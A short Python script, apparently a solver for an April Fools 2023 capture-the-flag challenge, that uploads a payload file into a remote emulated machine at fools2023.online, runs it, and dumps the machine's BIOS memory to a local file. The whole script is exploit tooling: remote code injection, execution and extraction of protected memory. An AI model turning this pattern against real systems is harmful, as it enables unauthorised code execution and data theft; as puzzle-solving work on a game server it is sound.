#!/usr/bin/env python
import io
import argparse
import statistics
import sys
import itertools
import threading
import time
import pexpect
from typing import *

import foolsocket


def main():
    with open("../payloads/BIOS_PWN.PRG", "rb") as file:
        pwn = file.read()

    f = foolsocket.FoolsSocket("fools2023.online", 13337)
    f.write_bytes(0x2000, pwn)
    f.execute_at(0x2000)

    bios = f.read_bytes(0x3000, 0x1000)
    with open("../dumps/BIOS.bin", "wb") as file:
        file.write(bios)


if __name__ == '__main__':
    main()
